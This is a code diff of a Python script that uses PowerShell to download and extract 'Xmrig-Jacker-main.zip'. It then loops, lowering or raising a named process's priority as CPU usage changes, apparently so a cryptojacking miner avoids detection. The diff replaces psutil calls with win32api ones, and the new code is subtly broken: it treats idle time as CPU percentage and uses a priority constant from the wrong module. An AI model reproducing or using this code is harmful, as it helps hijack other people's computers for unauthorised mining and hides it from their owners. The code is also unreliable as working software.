@@ -1,13 +1,19 @@
 import os
 import subprocess
 import shutil
-import time
-import psutil
 import ctypes
+import win32api
+import time
 
 def download_and_extract(url, output_dir):
     subprocess.run(["powershell", "Invoke-WebRequest", url, "-OutFile", os.path.join(output_dir, "Xmrig-Jacker-main.zip")])
     shutil.unpack_archive(os.path.join(output_dir, "Xmrig-Jacker-main.zip"), output_dir)
+
+def set_process_priority(pid, priority):
+    PROCESS_SET_INFORMATION = 0x0200
+    handle = win32api.OpenProcess(PROCESS_SET_INFORMATION, False, pid)
+    win32api.SetPriorityClass(handle, priority)
+    win32api.CloseHandle(handle)
 
 def main():
     temp_dir = "C:/temp"
@@ -28,19 +34,20 @@ def main():
     low_usage_threshold = 25
 
     while True:
-        cpu_usage = psutil.cpu_percent(interval=5)
-
+        cpu_usage = win32api.GetSystemTimes()[0]  # Get the idle time
         if cpu_usage >= high_usage_threshold:
-            for proc in psutil.process_iter(attrs=['pid', 'name']):
-                if process_name in proc.info['name']:
-                    p = psutil.Process(proc.info['pid'])
-                    p.nice(psutil.IDLE_PRIORITY_CLASS)
+            for proc in subprocess.check_output(["tasklist"]).splitlines():
+                if process_name.encode() in proc:
+                    pid = int(proc.split()[1])
+                    set_process_priority(pid, win32api.IDLE_PRIORITY_CLASS)
 
         elif cpu_usage < low_usage_threshold:
-            for proc in psutil.process_iter(attrs=['pid', 'name']):
-                if process_name in proc.info['name']:
-                    p = psutil.Process(proc.info['pid'])
-                    p.nice(psutil.NORMAL_PRIORITY_CLASS)
+            for proc in subprocess.check_output(["tasklist"]).splitlines():
+                if process_name.encode() in proc:
+                    pid = int(proc.split()[1])
+                    set_process_priority(pid, win32api.NORMAL_PRIORITY_CLASS)
+
+        time.sleep(5)
 
 if __name__ == "__main__":
     main()
